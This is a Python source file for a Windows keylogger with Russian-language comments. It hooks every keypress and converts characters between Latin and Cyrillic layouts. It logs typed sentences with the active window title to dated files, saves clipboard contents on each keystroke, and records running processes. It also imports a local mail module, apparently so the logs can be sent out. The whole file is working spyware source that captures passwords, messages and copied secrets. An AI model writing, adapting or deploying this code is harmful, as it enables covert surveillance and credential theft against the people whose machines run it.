import keyboard
import ctypes
import logging
from mail import *
import pygetwindow as gw
import psutil
import pyperclip
import datetime

today = datetime.datetime.now().strftime('%Y-%m-%d')

log_file_name = f'keylog_{today}.txt'
clipboard_file_name = f'clipboard_{today}.txt'
process_log_file = f'processes_{today}.txt'

try:
    with open(log_file_name, 'x', encoding='utf-8') as f:
        pass
    with open(clipboard_file_name, 'x', encoding='utf-8') as f:
        pass
    with open(process_log_file, 'x', encoding='utf-8') as f:
        pass
except FileExistsError:
    print("Файл журнала уже существует!")
    exit()
except IOError as e:
    print(f"Ошибка ввода-вывода при создании файла журнала: {e}")
    exit()

logging.basicConfig(filename=log_file_name, level=logging.DEBUG, format="%(asctime)s - %(message)s")

language_codes = {
    '0x409': 'English - United States',
    '0x809': 'English - United Kingdom',
    '0x419': 'Russian',
}

latin_into_cyrillic = (
    "`QWERTYUIOP[]ASDFGHJKL;'ZXCVBNM,./" +
    "qwertyuiop[]asdfghjkl;'zxcvbnm,./" +
    "~`{[}]:;\"'|<,>.?/@#$^&",

    "ёЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ." +
    "йцукенгшщзхъфывапролджэячсмитьбю." +
    "ЁёХхЪъЖжЭэ/БбЮю,.\"№;:?"
)

cyrillic_into_latin = (latin_into_cyrillic[1], latin_into_cyrillic[0])

latin_into_cyrillic_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*latin_into_cyrillic)])
cyrillic_into_latin_trantab = dict([(ord(a), ord(b)) for (a, b) in zip(*cyrillic_into_latin)])

cyrillic_layouts = ['Russian', 'Belarusian', 'Kazakh', 'Ukrainian']

# Переменная для хранения текущего предложения
current_sentence = ""


def detect_keyboard_layout_win():
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)

    try:
        language = language_codes[str(lid_hex)]
    except KeyError:
        language = language_codes.get('0x409', 'English - United States')  # English (US) by default
    return language


def cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language):
    if ord(key_pressed) in cyrillic_into_latin_trantab:
        key_pressed = chr(cyrillic_into_latin_trantab[ord(key_pressed)])

    elif current_keyboard_language in cyrillic_layouts and initial_keyboard_language not in cyrillic_layouts:
        if ord(key_pressed) in latin_into_cyrillic_trantab:
            key_pressed = chr(latin_into_cyrillic_trantab[ord(key_pressed)])

    return key_pressed


def process_sentence(sentence):
    active_window = get_active_window()
    try:
        logging.info(f"[Active Window] {active_window}")
        logging.info(str(sentence))
    except IOError as e:
        print(f"Ошибка ввода-вывода при записи в файл журнала: {e}")


def get_active_window():
    active_window = gw.getActiveWindow()
    if active_window is not None:
        return active_window.title
    else:
        return "Unknown"


def get_active_processes():
    active_processes = []
    for process in psutil.process_iter(['pid', 'name']):
        active_processes.append(process.info)
    return active_processes


def update_clipboard(current_value):
    current_time = datetime.datetime.now()

    with open(clipboard_file_name, 'r+') as f:
        if str(current_value) in f.read():
            pass
        else:
            f.write(f"{str(current_time)} - [Clipboard] {current_value}\n")


def process_hotkey(hotkey):
    logging.info(f"[key] {hotkey}")


def keypress_callback(event):
    global current_sentence

    key_pressed = event.name

    clipboard_content = pyperclip.paste()
    update_clipboard(clipboard_content)

    if event.event_type == keyboard.KEY_DOWN and event.name != "backspace" and len(key_pressed) > 1:
        process_hotkey(key_pressed)

        if len(current_sentence) > 16 and key_pressed == "space" or key_pressed == "enter":
            process_sentence(current_sentence)
            current_sentence = ""

        return

    current_keyboard_language = detect_keyboard_layout_win()

    if key_pressed == "backspace" and current_sentence:
        current_sentence = current_sentence.rstrip()
        return

    if len(key_pressed) == 1:
        if 'English' in current_keyboard_language and 'English' not in initial_keyboard_language:
            key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)

        if 'Russian' in current_keyboard_language and 'Russian' not in initial_keyboard_language:
            key_pressed = cyrillic_to_latin_to_cyrillic(key_pressed, current_keyboard_language)

        current_sentence += key_pressed

        if key_pressed in ['.', '!', '?']:
            process_sentence(current_sentence)
            current_sentence = ""


initial_keyboard_language = detect_keyboard_layout_win()


def save_running_processes():
    with open(process_log_file, 'w', encoding='utf-8') as f:
        active_processes = get_active_processes()
        for process in active_processes:
            f.write(f"PID: {process['pid']}, Name: {process['name']}\n")


if __name__ == "__main__":
    save_running_processes()

keyboard.on_press(keypress_callback)
keyboard.wait()